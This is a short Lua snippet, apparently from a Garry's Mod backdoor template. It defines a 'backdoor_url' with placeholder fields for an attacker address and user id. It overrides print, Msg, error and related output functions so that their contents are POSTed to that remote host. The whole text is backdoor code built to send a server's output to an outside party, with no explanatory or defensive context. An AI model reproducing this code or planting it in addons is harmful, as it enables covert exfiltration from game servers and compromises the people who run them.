local backdoor_url = "http://{MYADDRESS}?" 
local send = function(msg, to) http.Post(backdoor_url, {message = msg, uid = to}) end
local function hus(id) return function(...) send(id .. ": " .. string.Implode(" ", {...}), "{USERID}") end end 
local print, Msg, MsgN, error, ErrorNoHalt, PrintTable =  hus("print"), hus("Msg"), hus("MsgN"), hus("error"), hus("ErrorNoHalt"), function(e) hus("PrintTable")(util.TableToJSON(e)) end 
